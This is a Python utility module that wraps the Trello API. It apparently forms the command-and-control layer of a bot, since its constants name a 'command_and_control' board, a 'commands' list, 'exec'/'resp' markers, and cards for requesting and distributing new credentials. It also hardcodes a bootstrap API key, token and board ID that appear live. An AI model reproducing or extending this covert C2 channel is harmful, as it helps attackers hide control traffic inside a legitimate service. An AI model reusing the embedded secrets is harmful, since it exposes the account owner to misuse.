import requests
import json

# maybe erase bootstrap
BOOTSTRAP_TOKEN = '0371b95aaa9e16d0089fa4d55d078f5fab508c5af7e2d82a7c57aa6be908778b'
BOOTSTRAP_KEY = '0e0a04d5f73b65a679a0b49f2f62df9a'
BOOTSTRAP_BOARD_ID = '639637edc1f14f01dd74eff6'
BOOTSTRAP_LIST_NAME_PREFIX = 'new_creds_'
BOT_BOARD_NAME = 'command_and_control'
BOT_LIST_NAME = 'commands'
TRELLO_URL = 'https://api.trello.com/1/'
SUCCESS = 200
CRED_ANS_CARD_NAME = 'new creds'
CRED_REQ_CARD_NAME = 'request for new account'
KEY_TOKEN_SEPERATOR = ':'
COMMAND_TOKEN_SEPERATOR = ':'
COMMAND_REQ_NAME = "exec"
COMMAND_RESP_NAME = "resp"
TODO_LIST_NAME = "To Do"
DONE_LIST_NAME = "Done"

HTTP_ERROR = -1
INVALID_CREDENTIALS = -2
NOT_FOUND = -3
BOOTSTRAP_ERROR = -4

# TODO make the utils generic in regards to key,token since server uses many of them


def check_response(response, err_message):
    if response.status_code != SUCCESS:
        print(err_message)
        print("status code is " + str(response.status_code))
        print(response.text)
        return HTTP_ERROR
    return 0

# request type is "GET"\"POST"
# function returns the response


def send_request(key, token, request_type, url_details, query_parameters={}, request_parameters={}):
    url = TRELLO_URL + url_details
    query = {
        'key': key,
        'token': token
    }
    query.update(query_parameters)
    response = requests.request(
        request_type,
        url,
        params=query,
        **request_parameters  # fishy
    )
    return response


def create_list(key, token, list_name, board_id):
    url_details = '/lists'
    query_parameters = {
        'name': list_name,
        'idBoard': board_id
    }
    response = send_request(key, token, 'POST', url_details, query_parameters)
    if (check_response(response, "ERROR: failed to create list. name = " + list_name) < 0):
        return HTTP_ERROR
    return 0


def create_board(key, token, board_name):
    url_details = '/boards/'
    query_parameters = {
        'name': board_name
    }
    response = send_request(
        key, token, 'POST', url_details=url_details, query_parameters=query_parameters)
    if (check_response(response, "ERROR: failed to create board. name = " + board_name) < 0):
        return HTTP_ERROR
    return 0


def create_card(key, token, list_id, name, desc=""):
    url_details = '/cards/'
    query_parameters = {
        'name': name,
        'idList': list_id
    }
    if desc != "":
        query_parameters['desc'] = desc
    response = send_request(
        key, token, 'POST', url_details=url_details, query_parameters=query_parameters)
    if (check_response(response, "ERROR: failed to create card. name = " + name) < 0):
        return HTTP_ERROR
    return 0


def get_all_boards(key, token):
    url_details = 'members/me/boards/'
    headers = {
        "Accept": "application/json"
    }
    response = send_request(key, token, 'GET', url_details,
                            request_parameters={'headers': headers})
    if (check_response(response, "ERROR: failed to get all boards") < 0):
        return []
    return json.loads(response.text)


def get_board(key, token, board_id):
    url_details = '/boards/' + board_id
    headers = {
        "Accept": "application/json"
    }
    response = send_request(key, token, 'GET', url_details,
                            request_parameters={'headers': headers})
    if (check_response(response, "ERROR: failed to get board. id = " + board_id) < 0):
        return None
    return json.loads(response.text)


def get_list(key, token, list_id):
    url_details = '/lists/' + list_id
    response = send_request(key, token, 'GET', url_details)
    if (check_response(response, "ERROR: failed to get list. id = " + list_id) < 0):
        return None
    return json.loads(response.text)


def get_card(key, token, card_id):
    url_details = '/cards/' + card_id
    response = send_request(key, token, 'GET', url_details)
    if (check_response(response, "ERROR: failed to get card. id = " + card_id) < 0):
        return None
    return json.loads(response.text)


def get_cards_in_list(key, token, list_id):
    url_details = '/lists/' + list_id + '/cards'
    headers = {
        "Accept": "application/json"
    }
    response = send_request(key, token, 'GET', url_details,
                            request_parameters={'headers': headers})
    if (check_response(response, "ERROR: failed to get cards in list. list id = " + list_id) < 0):
        return []
    return json.loads(response.text)


def get_lists_in_board(key, token, board_id):
    url_details = '/boards/' + board_id + '/lists'
    headers = {
        "Accept": "application/json"
    }
    response = send_request(key, token, 'GET', url_details,
                            request_parameters={'headers': headers})
    if (check_response(response, "ERROR: failed to get lists in board. board id = " + board_id) < 0):
        return []
    return json.loads(response.text)


def get_command_from_card(key, token, card_id):
    card = get_card(key, token, card_id)
    if not card:
        return ""
    desc = card['desc']
    return desc


def get_creds_from_card(key, token, card_id):
    desc = get_command_from_card(key, token, card_id)
    if not desc or KEY_TOKEN_SEPERATOR not in desc:
        return '', ''
    desc_sep = desc.split(KEY_TOKEN_SEPERATOR)
    return desc_sep[0], desc_sep[1]


def archive_list(key, token, list_id):
    url_details = '/lists/' + list_id + '/closed'
    response = send_request(key, token, 'PUT', url_details)
    if (check_response(response, "ERROR: failed to archive list. id = " + list_id) < 0):
        return HTTP_ERROR
    return 0


def get_board_id(key, token, board_name):
    boards = get_all_boards(key, token)
    if not boards:
        return ''
    for board in boards:
        if board['name'] == board_name:
            return board['id']
    return ''


def get_list_id(key, token, list_name, board_id):
    lists = get_lists_in_board(key, token, board_id)
    if not lists:
        return ''
    for list in lists:
        if list['name'] == list_name:
            return list['id']
    return ''


def get_card_id(key, token, card_name, list_id):
    cards = get_cards_in_list(key, token, list_id)
    if not cards:
        return ''
    for card in cards:
        if card['name'] == card_name:
            return card['id']
    return ''


def create_board_and_get_id(key, token, board_name):
    if create_board(key, token, board_name) < 0:
        return ''
    return get_board_id(key, token, board_name)


def create_list_and_get_id(key, token, list_name, board_id):
    if create_list(key, token, list_name, board_id) < 0:
        return ''
    return get_list_id(key, token, list_name, board_id)


def create_card_and_get_id(key, token, card_name, list_id):
    if create_card(key, token, list_id, card_name) < 0:
        return ''
    return get_card_id(key, token, card_name, list_id)

# def move_card_to_list(key, token, card_id, list_id):
#     url_details = '/cards/' + card_id + '/idList'
#     response = send_request(key, token, 'PUT', url_details, query_parameters={'value': list_id})
#     if (check_response(response, "ERROR: failed to move card to list. card id = " + card_id + ", list id = " + list_id) < 0):
#         return HTTP_ERROR
#     return 0
